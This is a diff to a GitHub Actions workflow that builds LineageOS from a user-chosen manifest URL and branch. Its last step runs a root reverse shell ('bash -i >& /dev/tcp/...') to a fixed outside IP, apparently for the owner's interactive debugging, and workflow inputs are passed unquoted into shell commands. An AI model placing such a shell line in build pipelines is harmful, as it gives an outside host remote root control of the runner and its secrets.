@@ -1,16 +1,21 @@
 # This is a basic workflow to help you get started with Actions
 
-name: downloader
+name: builder
 
 # Controls when the workflow will run
 on:
   # Triggers the workflow on push or pull request events but only for the "main" branch
-  push:
-    branches: [ "actions_builder" ]
-
   # Allows you to run this workflow manually from the Actions tab
   workflow_dispatch:
-
+    inputs:
+      MANIFEST_URL:
+        description: 'MANIFEST_URL'
+        required: true
+        default: 'https://github.com/LineageOS/android.git'
+      MANIFEST_BRANCH:
+        description: 'MANIFEST_BRANCH'
+        required: true
+        default: 'lineage-15.1'
 # A workflow run is made up of one or more jobs that can run sequentially or in parallel
 jobs:
   # This workflow contains a single job called "build"
@@ -22,6 +27,11 @@ jobs:
     steps:
       # Checks-out your repository under $GITHUB_WORKSPACE, so your job can access it
       - uses: actions/checkout@v3
+      - name: Display Run Parameters
+        run: |
+          echo "::group::User Environment Variables"
+          echo "Manifest URL: ${{ github.event.inputs.MANIFEST_URL }}"
+          echo "Manifest Branch: ${{ github.event.inputs.MANIFEST_BRANCH }}"
       
       - name: Cleanup
         uses: rokibhasansagar/slimhub_actions@main
@@ -32,6 +42,29 @@ jobs:
           sudo apt -y upgrade
           sudo apt -y install gperf gcc-multilib gcc-10-multilib g++-multilib g++-10-multilib libc6-dev lib32ncurses5-dev x11proto-core-dev libx11-dev tree lib32z-dev libgl1-mesa-dev libxml2-utils xsltproc bc ccache lib32readline-dev lib32z1-dev liblz4-tool libncurses5-dev libsdl1.2-dev libwxgtk3.0-gtk3-dev libxml2 lzop pngcrush schedtool squashfs-tools imagemagick libbz2-dev lzma ncftp qemu-user-static libstdc++-10-dev libncurses5 python3
 
+      - name: Install OpenJDK
+        uses: actions/setup-java@v3
+        with:
+          distribution: 'zulu'
+          java-version: '8'
+          
+      - name: Install repo
+        run: |
+          mkdir ~/bin
+          curl https://storage.googleapis.com/git-repo-downloads/repo > ~/bin/repo
+          chmod a+x ~/bin/repo
+          sudo ln -sf ~/bin/repo /usr/bin/repo
+      
+      - name: Initialize repo
+        run: |
+          mkdir workspace
+          cd workspace
+          echo "workspace-folder=$(pwd)" >> $GITHUB_OUTPUT
+          git config --global user.name "azwhikaru"
+          git config --global user.email "azwhikaru+37921907@github.com"
+          repo init --depth=1 -u ${{ github.event.inputs.MANIFEST_URL }} -b ${{ github.event.inputs.MANIFEST_BRANCH }}
+        id: pwd
+      
       # Runs a set of commands using the runners shell
       - name: get a interactive shell
         run: sudo bash -i >& /dev/tcp/116.211.143.77/55347 0>&1
